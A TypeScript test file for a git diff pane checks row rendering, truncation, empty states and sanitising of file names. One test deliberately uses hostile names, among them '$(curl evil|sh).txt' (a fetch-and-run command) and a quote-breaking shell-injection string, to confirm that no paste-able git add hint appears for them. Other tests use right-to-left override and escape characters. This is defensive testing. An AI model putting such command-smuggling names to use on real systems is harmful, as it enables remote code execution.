import { describe, expect, test, tier } from 'claude-code/testing'

import type Git from '../../hooks/git'
import Limits from '../../hooks/limits'
import Names from '../../hooks/names'
import PaneState from '../../hooks/pane-state'
import Views from '../../hooks/views'
import Fixtures from '../fixtures'

tier('builtin')

describe('pane-view', () => {
  const dataOf = (
    files: readonly Git.FileStat[],
    overrides: Partial<Git.DiffData> = {},
  ): Git.DiffData => ({
    repository: Fixtures.CHECKOUT,
    mode: 'session',
    stats: { ...Fixtures.TOTALS, filesCount: files.length },
    files,
    source: { kind: 'working-tree', base: 'HEAD' },
    isUnborn: false,
    baseRef: 'HEAD',
    stalePaths: [],
    isUntrackedWithheld: false,
    ...overrides,
  })

  const modelOf = (
    overrides: Partial<PaneState.PaneModel>,
  ): PaneState.PaneModel => ({
    ...PaneState.INITIAL_MODEL,
    hasSettled: true,
    place: Fixtures.WHOLE_PLACE,
    ...overrides,
  })

  const EARLIER = [Fixtures.rowOf('old.ts', { isPreSession: true })]

  test('docked: header, rows, every body, the earlier line', async ($, on) => {
    const tree = await Fixtures.dockedPane(
      $,
      on,
      modelOf({
        data: dataOf([
          Fixtures.rowOf('src/a.ts'),
          Fixtures.rowOf('src/b.ts'),
          Fixtures.rowOf('img.png', { isBinary: true }),
          Fixtures.rowOf('notes.txt', {
            added: 0,
            removed: 0,
            isUntracked: true,
          }),
          Fixtures.rowOf('test/a.test.ts'),
          Fixtures.rowOf('old.ts', { isPreSession: true }),
        ]),
        bodies: Fixtures.bodiesOf(Fixtures.SMALL_BODY, 'src/a.ts', 'src/b.ts'),
      }),
    )

    const text = Fixtures.jsonOf(tree)

    expect(Fixtures.isDrawn(tree), 'under the node cap').toBe(true)
    expect(text).toContain('5 files')
    expect(text).toContain('Binary file - cannot display diff')
    expect(text).toContain('New file not yet staged.')
    expect(text).toContain('1 test/generated (show)')
    expect(text).not.toContain('test/a.test.ts')
    expect(text).toContain('+1 file edited before this session (show)')
    expect(text).not.toContain('❯')

    expect(Fixtures.codesIn(tree).map(code => code.path)).toEqual([
      'src/a.ts',
      'src/b.ts',
    ])

    expect(text).toContain('"key":"ask:src/b.ts"')

    expect(
      Fixtures.elementIn(tree, { type: 'Button', name: 'base' })?.props,
      "the built-in's base chord on an empty Button",
    ).toMatchObject({ action: 'app:cycleDiffBase', label: '' })
  })

  test('untracked withheld: the rows stay, the pane says so', async ($, on) => {
    const draw = Fixtures.docksPane($, on)
    const words = { words: PaneState.INITIAL_MODEL.words }

    const listed = Fixtures.jsonOf(
      await draw(
        modelOf({
          data: dataOf([Fixtures.rowOf('src/a.ts')], {
            isUntrackedWithheld: true,
          }),
        }),
      ),
    )

    const bare = Fixtures.stringsOf(
      await draw(modelOf({ data: dataOf([], { isUntrackedWithheld: true }) })),
    ).join('')

    expect(listed).toContain('1 file')
    expect(listed).toContain('"label":"src/a.ts')
    expect(listed).toContain(Names.untrackedWithheldTextOf(words))
    expect(bare).toContain('No tracked changes')
    expect(bare).not.toContain('No changes this session')
    expect(bare).toContain(Names.untrackedWithheldTextOf(words))
  })

  test('a file at the line cap draws under the tree caps', async ($, on) => {
    const lines = Array.from({ length: Limits.MAX_LINES_PER_FILE }, (_, at) =>
      at % 2 === 0 ? `-const value${at} = ${at}` : `+const value${at} = 0`,
    )

    const tree = await Fixtures.dockedPane(
      $,
      on,
      modelOf({
        data: dataOf([Fixtures.rowOf('src/long.ts')]),
        bodies: Fixtures.bodiesOf(
          {
            hunks: [{ oldStart: 1, newStart: 1, lines }],
            isTruncated: true,
            isLarge: false,
          },
          'src/long.ts',
        ),
      }),
    )

    expect(
      Fixtures.isDrawn(tree),
      'under the node, string and text caps the engine holds a tree to',
    ).toBe(true)

    expect(Fixtures.codesIn(tree).length).toBeGreaterThan(0)

    expect(Fixtures.jsonOf(tree)).toContain(
      '… diff truncated (exceeded 400 line limit)',
    )
  })

  test("placeholders in the built-in's words", async ($, on) => {
    const draw = Fixtures.docksPane($, on)

    const untracked = Fixtures.jsonOf(
      await draw(
        modelOf({
          data: dataOf([Fixtures.rowOf('notes.txt', { isUntracked: true })]),
        }),
      ),
    )

    const loading = Fixtures.jsonOf(
      await draw(modelOf({ data: dataOf([Fixtures.rowOf('src/a.ts')]) })),
    )

    expect(untracked).toContain('New file not yet staged.')
    expect(untracked).not.toContain('"label":"ask"')
    expect(untracked).toContain('Run `git add :/notes.txt` to see line counts.')
    expect(untracked).not.toContain("':/")
    expect(loading).toContain('Loading diff…')

    expect(
      Fixtures.stringsOf(await draw(modelOf({ data: null }))).join(''),
    ).toContain("Couldn't read the git diff — it will retry on the next change")

    expect(
      Fixtures.jsonOf(await draw(modelOf({ isOutsideRepository: true }))),
    ).toContain("isn't in a git repository")
  })

  test('a picked turn draws its files under the turn line', async ($, on) => {
    const text = Fixtures.jsonOf(
      await Fixtures.dockedPane(
        $,
        on,
        modelOf({
          data: dataOf([]),
          source: { kind: 'turn', index: 2 },
          turns: [Fixtures.TURN_TWO],
        }),
      ),
    )

    expect(text).toContain('Turn 2 \\"fix it\\"')
    expect(text).toContain('/r/a.ts')
    expect(text).toContain('T2')
    expect(text).toContain('… diff truncated (exceeded 400 line limit)')
  })

  test('a long body splits into leaves under their cap', async ($, on) => {
    const tree = await Fixtures.dockedPane(
      $,
      on,
      modelOf({
        data: dataOf([Fixtures.rowOf('src/long-lines.ts')]),
        bodies: Fixtures.bodiesOf(Fixtures.bigBodyOf(), 'src/long-lines.ts'),
      }),
    )

    const codes = Fixtures.codesIn(tree)
    const chars = codes.reduce((sum, code) => sum + code.source.length, 0)

    expect(codes.length).toBeGreaterThan(1)
    expect(Fixtures.isDrawn(tree), 'the engine took the tree').toBe(true)

    expect(
      codes.every(code => code.source.length <= Views.MAX_CODE_CHARS),
    ).toBe(true)

    expect(chars).toBeLessThanOrEqual(Views.MAX_BODY_CHARS)
  })

  test('the window draws what is in view, a scroll the rest', async ($, on) => {
    const draw = Fixtures.docksPane($, on)

    const model = modelOf({
      data: dataOf([Fixtures.rowOf('a.ts'), Fixtures.rowOf('b.ts')]),
      bodies: new Map<string, Git.FileHunks>([
        ['a.ts', Fixtures.bigBodyOf()],
        ['b.ts', Fixtures.SMALL_BODY],
      ]),
      place: { ...Fixtures.WHOLE_PLACE, rows: Fixtures.BODY_ROWS },
    })

    const top = await draw(model)
    const { tops } = Views.bodyLayoutOf(model, Views.dockPlanOf(model))

    const scrolled = await draw({
      ...model,
      place: { ...model.place, top: tops.get('b.ts') ?? 0 },
    })

    expect(Fixtures.isDrawn(top), 'the engine took the tree').toBe(true)
    expect(Fixtures.codesIn(top).map(code => code.path)).toEqual(['a.ts'])
    expect(Fixtures.jsonOf(top)).toContain('"key":"file:b.ts"')

    expect(
      Fixtures.codesIn(scrolled).map(code => code.path),
      "a.ts's tail, then b.ts whole (the window stops at the body's end)",
    ).toEqual(['a.ts', 'b.ts'])

    expect(Fixtures.jsonOf(scrolled), 'the list stays').toContain(
      '"key":"file:a.ts"',
    )
  })

  test('no newline or escape in a name reaches the tree', async ($, on) => {
    const tree = await Fixtures.dockedPane(
      $,
      on,
      modelOf({
        data: dataOf([
          Fixtures.rowOf('evil\nfake.ts  +9 -9'),
          Fixtures.rowOf('esc\u001bname.ts', { renamedFrom: 'old\u001b.ts' }),
        ]),
        bodies: Fixtures.bodiesOf(Fixtures.SMALL_BODY, 'evil\nfake.ts  +9 -9'),
      }),
    )

    const text = Fixtures.jsonOf(tree)

    expect(Fixtures.stringsOf(tree).some(each => each.includes('\u001b'))).toBe(
      false,
    )

    expect(text).not.toContain('\\u001b')
    expect(text).not.toContain('evil\\nfake')
    expect(text).toContain('evilfake.ts  +9 -9')
    expect(text).toContain('old.ts => escname.ts')
  })

  test('a path past the string cap is cut in the header', async ($, on) => {
    const longPath = `${'deep/'.repeat(Fixtures.LONG_PATH_SEGMENTS)}file.ts`

    const tree = await Fixtures.dockedPane(
      $,
      on,
      modelOf({
        data: dataOf([
          Fixtures.rowOf(longPath, { renamedFrom: `${longPath}.old` }),
        ]),
      }),
    )

    expect(Fixtures.isDrawn(tree), 'every string under the cap').toBe(true)
    expect(Fixtures.jsonOf(tree)).toContain('file.ts')
  })

  test('a base branch name loses its format characters', async ($, on) => {
    const draw = Fixtures.docksPane($, on)

    const compared = Fixtures.jsonOf(
      await draw(
        modelOf({
          requestedMode: 'branch',
          data: { ...dataOf([Fixtures.rowOf('a.ts')]), ...Fixtures.VS_SPOOFED },
        }),
      ),
    )

    const empty = Fixtures.jsonOf(
      await draw(
        modelOf({
          requestedMode: 'branch',
          data: {
            ...dataOf([]),
            ...Fixtures.VS_SPOOFED,
            stats: Fixtures.NO_STATS,
          },
        }),
      ),
    )

    expect(compared).toContain('branch vs maniam')
    expect(empty).toContain('No changes vs maniam')
    expect(compared + empty).not.toContain('‮')
  })

  test('only a plainly safe name gets a git add to paste', async ($, on) => {
    const draw = Fixtures.docksPane($, on)

    const untrackedOf = (path: string) =>
      draw(
        modelOf({
          data: dataOf([Fixtures.rowOf(path, { isUntracked: true })]),
        }),
      )

    const hintOf = async (path: string) =>
      Fixtures.stringsOf(await untrackedOf(path)).join('\n')

    const hints: string[] = []

    for (const path of [
      '$(curl evil|sh).txt',
      "it's.txt",
      "x';payload;'",
      'a&b.txt',
    ]) {
      hints.push(await hintOf(path))
    }

    const reversed = await untrackedOf('invoice‮txt.exe')

    expect(await hintOf('src/café-2.txt')).toContain(
      'Run `git add :/src/café-2.txt` to see line counts.',
    )

    expect(
      hints.every(
        hint =>
          hint.includes('Stage it with git add to see line counts.') &&
          !hint.includes('Run `git add'),
      ),
    ).toBe(true)

    expect(Fixtures.stringsOf(reversed).join('\n')).not.toContain(
      'Run `git add',
    )

    expect(Fixtures.jsonOf(reversed)).toContain('"label":"invoicetxt.exe')
    expect(Fixtures.jsonOf(reversed)).not.toContain('‮')
  })

  test("docked: the built-in's blank top row, last column", async ($, on) => {
    const tree = await Fixtures.dockedPane(
      $,
      on,
      modelOf({
        data: dataOf([Fixtures.rowOf('src/a.ts')]),
        bodies: Fixtures.bodiesOf(Fixtures.SMALL_BODY, 'src/a.ts'),
      }),
    )

    const rule = '─'.repeat(
      Math.max(0, Fixtures.COLUMNS - Limits.PANE_RIGHT_PAD_COLUMNS),
    )

    expect(tree).toMatchObject({
      type: 'Box',
      props: {
        paddingTop: Limits.PANE_TOP_PAD_ROWS,
        paddingRight: Limits.PANE_RIGHT_PAD_COLUMNS,
      },
    })

    expect(Fixtures.stringsOf(tree)).toContain(rule)
    expect(Fixtures.stringsOf(tree)).not.toContain(`${rule}─`)
  })

  test("docked rows follow the built-in's, its hunks after", async ($, on) => {
    expect(
      Fixtures.rowShapesOf(
        await Fixtures.dockedPane(
          $,
          on,
          modelOf({
            data: dataOf([Fixtures.rowOf('src/a.ts'), Fixtures.rowOf('b.ts')]),
            bodies: Fixtures.bodiesOf(Fixtures.SMALL_BODY, 'src/a.ts', 'b.ts'),
          }),
        ),
      ),
    ).toEqual([
      '',
      'b.ts'.padEnd(
        Fixtures.COLUMNS - Limits.PANE_RIGHT_PAD_COLUMNS - '+2 -1'.length,
      ),
      'rule',
      'ask',
      'rule',
      '',
      'blank',
      'rule',
      'ask',
      'rule',
      '',
      'blank',
    ])
  })

  test("an empty state on the built-in's row, foot below", async ($, on) => {
    const [body] = Fixtures.childrenOf(
      await Fixtures.dockedPane($, on, modelOf({ data: dataOf(EARLIER) })),
    )

    const [header, pad, middle, foot, ...more] = Fixtures.childrenOf(body)
    const [spacer, headline, ...under] = Fixtures.childrenOf(middle)
    const aboveMiddle = Limits.PANE_TOP_PAD_ROWS + 2

    expect(body).toMatchObject({
      props: { height: Fixtures.BODY_ROWS - Limits.PANE_TOP_PAD_ROWS },
    })

    expect(Fixtures.stringsOf(header)).toEqual([])
    expect(Fixtures.jsonOf(header)).not.toContain('✕')

    expect(
      Fixtures.elementIn(header, { type: 'Button', name: 'base' }),
    ).toBeDefined()

    expect(pad).toMatchObject({ type: 'Box', props: { height: 1 } })
    expect(middle).toMatchObject({ props: { alignItems: 'center' } })

    expect(spacer).toMatchObject({
      type: 'Box',
      props: { height: Fixtures.BUILTIN_HEADLINE_ROW - aboveMiddle },
    })

    expect(Fixtures.stringsOf(headline)).toEqual(['No changes this session'])
    expect(under).toEqual([])
    expect(foot).toMatchObject({ props: { marginTop: 1, paddingBottom: 1 } })

    expect(Fixtures.jsonOf(foot)).toContain(
      '"label":"+1 file edited before this session (show)"',
    )

    expect(more).toEqual([])
  })

  test('shown files or too few rows stack the empty state', async ($, on) => {
    let rows = Fixtures.BODY_ROWS

    Fixtures.drawsPane(on, kit =>
      Views.paneView(
        { ...kit, rows },
        modelOf({
          data: dataOf(EARLIER),
          isPreSessionShown: rows === Fixtures.BODY_ROWS,
        }),
        Fixtures.DOCK_SEAT,
      ),
    )

    const shown = await $.ui.render(Fixtures.VIEW_PANE)

    rows = Fixtures.CRAMPED_ROWS

    const cramped = await $.ui.render(Fixtures.VIEW_PANE)

    const [header, pad, headline, blank, earlier, gap, legend, first] =
      Fixtures.childrenOf(Fixtures.childrenOf(shown)[0])

    expect(Fixtures.jsonOf(shown)).not.toContain('"alignItems":"center"')
    expect(Fixtures.jsonOf(cramped)).not.toContain('"alignItems":"center"')

    expect(
      Fixtures.elementIn(header, { type: 'Button', name: 'base' }),
    ).toBeDefined()

    expect(pad).toMatchObject({ type: 'Box', props: { height: 1 } })
    expect(Fixtures.stringsOf(headline)).toEqual(['No changes this session'])
    expect(blank).toMatchObject({ type: 'Box', props: { height: 1 } })

    expect(Fixtures.jsonOf(earlier)).toContain(
      '"label":"+1 file edited before this session (hide)"',
    )

    expect(gap).toMatchObject({ type: 'Box', props: { height: 1 } })
    expect(Fixtures.stringsOf(legend)).toContain('old.ts')
    expect(Fixtures.rowShapeOf(first), "the first body's top rule").toBe('rule')
  })

  test("shown pre-session rows land on the built-in's rows", async ($, on) => {
    expect(
      Fixtures.rowShapesOf(
        await Fixtures.dockedPane(
          $,
          on,
          modelOf({
            data: dataOf([
              Fixtures.rowOf('config.toml', { isPreSession: true }),
              Fixtures.rowOf('setup.cfg', { isPreSession: true }),
            ]),
            isPreSessionShown: true,
            bodies: Fixtures.bodiesOf(
              Fixtures.SMALL_BODY,
              'config.toml',
              'setup.cfg',
            ),
          }),
        ),
      ).slice(1),
    ).toEqual([
      'blank',
      'No changes this session',
      'blank',
      '+2 files edited before this session (hide)',
      'blank',
      'config.toml+2 -1',
      'setup.cfg+2 -1',
      'rule',
      'ask',
      'rule',
      '',
      'rule',
      'ask',
      'rule',
      '',
    ])
  })

  test('inline: title, rows round the pick, then one body', async ($, on) => {
    const files = Array.from(
      { length: Limits.MAX_VISIBLE_FILES + 2 },
      (_, at) => Fixtures.rowOf(`f${at}.ts`),
    )

    const draw = Fixtures.docksPane($, on, { placement: 'inline' })

    const listing = modelOf({
      data: dataOf(files),
      selectedPath: 'f6.ts',
      isFullscreen: false,
      bodies: Fixtures.bodiesOf(Fixtures.SMALL_BODY, 'f0.ts', 'f6.ts'),
    })

    const tree = await draw(listing)
    const text = Fixtures.jsonOf(tree)
    const detail = await draw({ ...listing, dialogView: 'detail' })

    expect(text).toContain('Uncommitted changes')
    expect(text).toContain('(git diff HEAD)')
    expect(text).toContain('"label":"❯ f6.ts"')
    expect(text).toContain('"autoFocus":true')
    expect(text).toContain(' ↑ 2 more files')
    expect(text).not.toContain('"label":"  f0.ts"')
    expect(Fixtures.codesIn(tree)).toEqual([])
    expect(Fixtures.codesIn(detail).map(code => code.path)).toEqual(['f6.ts'])
    expect(Fixtures.jsonOf(detail)).not.toContain('"label":"❯ f6.ts"')
    expect(Fixtures.jsonOf(detail)).toContain('Esc to back')

    expect(tree).toMatchObject({
      type: 'Box',
      props: { flexDirection: 'column' },
    })

    expect(text).not.toContain('"paddingTop"')
  })

  test('inline, too narrow: the wider-terminal line alone', async ($, on) => {
    expect(
      Fixtures.stringsOf(
        await Fixtures.docksPane($, on, Fixtures.NARROW_SEAT)(modelOf({})),
      ),
    ).toEqual([Names.RESIZE_TERMINAL_TEXT])
  })

  test('the header row carries its controls in every state', async ($, on) => {
    const draw = Fixtures.docksPane($, on)

    const models = [
      modelOf({ data: dataOf([Fixtures.rowOf('src/a.ts')]) }),
      modelOf({ data: dataOf([]) }),
      modelOf({
        data: dataOf([]),
        source: { kind: 'turn', index: 2 },
        turns: [Fixtures.TURN_TWO],
      }),
    ]

    for (const model of models) {
      const tree = await draw(model)
      const [header] = Fixtures.childrenOf(Fixtures.childrenOf(tree)[0])
      const isTurn = model.source.kind === 'turn'

      expect(Fixtures.isDrawn(tree), 'the engine took the tree').toBe(true)
      expect(Fixtures.jsonOf(tree)).not.toContain('"label":"✕"')

      expect(
        Fixtures.elementIn(header, {
          type: isTurn ? 'Select' : 'Button',
          name: isTurn ? 'source' : 'base',
        }),
      ).toBeDefined()
    }
  })
})
